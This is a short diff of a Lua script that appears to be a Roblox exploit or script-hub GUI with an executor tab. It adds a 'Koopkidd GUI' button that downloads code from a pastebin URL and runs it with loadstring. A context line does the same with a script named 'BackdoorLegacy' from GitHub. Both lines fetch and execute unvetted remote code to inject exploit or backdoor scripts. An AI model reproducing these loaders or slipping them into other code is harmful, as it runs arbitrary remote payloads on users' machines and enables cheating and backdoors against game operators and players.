@@ -141,7 +141,11 @@ end)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua"))()
 end)
 
- -- EXECUTOR
+    createButton(homeTab, "Koopkidd GUI", function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/MDhZWF0P"))()
+end)
+
+    -- EXECUTOR
     local label = Instance.new("TextLabel", execTab)
     label.Size = UDim2.new(1, -20, 0, 25)
     label.Position = UDim2.new(0, 10, 0, 0)
